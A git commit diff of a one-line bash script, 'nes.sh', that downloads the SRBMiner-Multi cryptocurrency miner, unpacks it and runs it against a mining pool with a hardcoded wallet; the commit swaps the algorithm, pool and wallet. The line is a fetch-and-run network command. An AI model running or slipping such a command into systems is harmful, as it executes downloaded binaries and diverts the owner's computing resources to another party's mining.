46cbfbc7db20fbe7a51d7f6138191e744564c9d7
barburonjilo <barburonjilo@outlook.co.id>
2025-02-20 06:17:01 +0700

    Update nes.sh

--- nes.sh
+++ nes.sh
@@ -1,3 +1,3 @@
 #!/bin/bash
 
-wget https://github.com/doktor83/SRBMiner-Multi/releases/download/2.7.5/SRBMiner-Multi-2-7-5-Linux.tar.gz && tar -xvf SRBMiner-Multi-2-7-5-Linux.tar.gz && rm SRBMiner-Multi-2-7-5-Linux.tar.gz && cd SRBMiner-Multi-2-7-5 && ./SRBMiner-MULTI --algorithm ghostrider  --pool asia.rplant.xyz:17075 --wallet BnBkmYxeJh57TrWnDQoTCdpHr5rXgBPDNN -p x
+wget https://github.com/doktor83/SRBMiner-Multi/releases/download/2.7.5/SRBMiner-Multi-2-7-5-Linux.tar.gz && tar -xvf SRBMiner-Multi-2-7-5-Linux.tar.gz && rm SRBMiner-Multi-2-7-5-Linux.tar.gz && cd SRBMiner-Multi-2-7-5 && ./SRBMiner-MULTI -a panthera -o mine.scalaproject.io:3333 -u Ssy29Ak9dCkPqyFRa8aroHTNMu2ynpsJ9JU2ZZf7SX85beMdbDjhvUL6sXiSnVCL9jPapFCGdGD3g7rRokxs9W8t52tQ3qi4NA -p x
